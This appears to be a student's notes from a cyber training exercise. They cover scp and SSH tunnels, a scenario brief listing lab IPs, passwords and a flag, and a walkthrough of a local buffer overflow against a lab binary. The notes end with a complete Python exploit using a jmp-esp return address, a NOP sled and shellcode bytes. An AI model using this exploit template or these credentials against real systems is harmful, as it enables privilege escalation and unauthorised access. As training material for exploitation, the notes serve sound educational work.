# scp command

## Syntax
```
scp <source> <destination>
```

## Local to Remote:
```
scp /path/to/file.txt student@10.50.XX.XX:/path/to/destination/file.txt
```

## Remote to Local:
```
ssh student@10.50.XX.XX:/path/to/source/file.txt .
```

## Remote to Local via tunnel:
```
ssh -MS /tmp/jump student@10.50.XX.XX

ssh -S /tmp/jump dummy -O forward -L 1111:192.168.28.XX:2222

scp -P 1111 creds@127.0.0.1:/path/to/source/file.txt /path/to/destination
```

## Local to Remote via tunnel:
```
scp -P 1111 /path/to/source/file.txt creds@127.0.0.1:/path/to/destination/file.txt
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Map Description

Gorgas Exploit Development (GED)
XX Mar 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: DEVOPS

Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.

Tools/Techniques: Exploit binaries on target systems using the tools below.

    Python
    OllyDBG or an equivelent graphical program
        http://www.ollydbg.de/
    GNU Debugger's(GDB) Python Exploit Development Assistance Module
        https://github.com/longld/peda
    MetaSploit
        https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty

Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.

Scheme of Maneuver:
>Jump Box: ```10.50.37.98```
>Password: ```v0cEcUbwIzY878p```
->T1: 192.168.28.111
-->T2: 192.168.28.105

>Jump Box: ```10.50.37.98```
>Password: ```v0cEcUbwIzY878p```
->donovian_grey_host
-->T3: 192.168.150.245

Target Section:

T1 
user: ```comrade```
pass: ```StudentWebExploitPassword```
Hostname: Donovian_Webserver
IP: ```192.168.28.111```
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: ```2222```
Action: Exploit binary.

```/.hidden/inventory.exe```
```/.secret/.verysecret.pdb```

T2 
```user: comrade```
pass: ```StudentWebExploitPassword```
Hostname: Donovian-Terminal
IP: ```192.168.28.105```
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: ```192.168.150.245```
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------# Challenge  

ELF Exploitation 1
8
Level III Challenge

Situation: Other teams have extracted this networked binary from a Donovian development network. It is believed to closely related to software running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks. You will be required to exfil a copy from the target to your Op Station.

Provided: Executable Package: ```inventory.exe```
Task: Perform a ```local buffer overflow``` on the vulnerable Linux executable, in order to gain access to the desired intel.
Method: Utilize RE toolset and python to launch and develop exploit.

```ASLR is disabled on the target machine```.

Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.

Enter the contents of /.secret/.verysecret.pdb as the flag

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Scheme of Manuver:
```
- unset environmentals
- run executable, break the buffer
- run proc map
- first memory adress after heap, and the very last address in the stack
	- ``` find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP) ```
- grab the first 4 memory addresses, change from little to big endian
	- nop sled ``` nop = "\x90" * 15 ```
- either msfconsole or msfvenom to generate the shellcode
	- ie
```

Before starting the scheme of manuver:
- try to identify the vulnerable function
- run it through strings on the Windows and the Linux OPs Stations

## unset environmentals
- run a "clean" gdb
```env = gdb ./file.exe```
- in the "clean gdb"
```show env```
```unset env COLUMNS```
```unset env LINES```
```run```

## run executable, break the buffer
- run a "dirty" gdb
```gdb ./file.exe```
- run the executable and break it
```run <<<$(./buffer.py)```
- what you should have in your (buffer.py) script:
```
#!/usr/bin/env python

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

```
- the buffer that you have is from the (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) website. Length I choose was 512 because this was the function that I enumerated in Ghidra:
```
  char local_4c [68];
  
  printf("Press enter to view inventory: ");
  fgets(local_4c,0x200,stdin);
# 0x200 = 512
    puts(
      "Total Inventory:\nBandages: 12\nKvass: 1.000\nTurnips: 12.000\n5.45x39: 20.000\nAK-74M: 200\n Zastava Koral: 50"
      );
  usleep(5000);
  return 0;
```
- so we can make out that the buffer is anywhere from 68-512 bytes.

## run proc map
- after you ran the executable and broke it, go to your "clean" gdb
```run```
```
Enter a string:
	random 
```

## first memory adress after heap, and the very last address in the stack
	 ``` find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP) ```


## grab the first 4 memory addresses, change from little to big endian
- nop sled
``` nop = "\x90" * 15 ```


## either msfconsole or msfvenom to generate the shellcode
	- ie

# buffer.py script:
```
#!/usr/bin/env python
 
#buffer size is 62
 
buffer = "A" * 76
#eip = "BBBB"
eip = "\x59\x3b\xde\xf7"
#eip = "\xab\x88\xf5\xf7"
#eip = "\xfb\x45\xf6\xf7"
#eip = "\x0f\x46\xf6\xf7"
 
#Grabbing jmp esp
# command you run: find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP)
 
#0xf7de3b59 -> f7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> f7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> f7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> f7 f6 46 0f -> "\x0f\x46\xf6\xf7"
 
 
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
 
 
nop = "\x90" * 15

buf =  b""
buf += b"\xdb\xcf\xb8\x96\x84\x1e\x72\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x11\x31\x43\x17\x83\xc3\x04\x03\xd5"
buf += b"\x97\xfc\x87\xb3\x9c\x58\xf1\x11\xc5\x30\x2c\xf6"
buf += b"\x80\x26\x46\xd7\xe1\xc0\x97\x4f\x29\x73\xf1\xe1"
buf += b"\xbc\x90\x53\x15\xa3\x56\x54\xe5\xbf\x37\x20\xc5"
buf += b"\x10\x96\xbb\x60\x0c\x94\x5e\x1e\xfd\x76\xd7\xbb"
buf += b"\x73\xfe\x64\x26\x17\x72\xee\xdc\xf9\x02\x94\x7e"
buf += b"\x06\xb4\x07\xf7\xe7\xf7\x28"
 
print(buffer+eip+nop+buf)
```




